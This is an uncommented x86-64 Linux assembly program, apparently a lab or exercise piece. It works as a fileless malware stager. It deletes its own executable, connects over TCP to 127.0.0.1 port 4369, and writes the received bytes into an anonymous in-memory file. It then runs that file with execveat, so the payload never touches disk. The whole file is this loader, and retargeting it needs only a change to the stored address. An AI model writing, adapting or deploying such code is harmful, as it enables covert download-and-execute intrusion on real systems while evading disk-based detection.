.intel_syntax noprefix
.global _start
_start:

mov rax, 87
mov rdi, [rsp+8]
syscall

sub rsp, 1024
mov rax, 41
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall
mov r12, rax

mov rax, 42
mov rdi, r12
lea rsi, [rip + addr]
mov rdx, 16
syscall

mov rax, 319
lea rdi, [rip + f]
mov rsi, 1
syscall
mov r13, rax
jmp receive 

receive:
mov rax, 45
mov rdi, r12
mov rsi, rsp
mov rdx, 1024
mov r10, 0x100
syscall
cmp rax, 0
jle execute
mov rdx, rax
mov rax, 1
mov rdi, r13
mov rsi, rsp
syscall
jmp receive 

execute:
mov rax, 3
mov rdi, r12
syscall
mov rax, 322
mov rdi, r13
lea rsi, [rip + f]
inc rsi
xor rdx, rdx
xor r10, r10
mov r8, 0x1000
syscall
add rsp, 1024
jmp exit

exit:
mov rax, 60
mov rdi, 0
syscall

addr:

.quad 0x0100007f11110002

f:

.asciz "y"
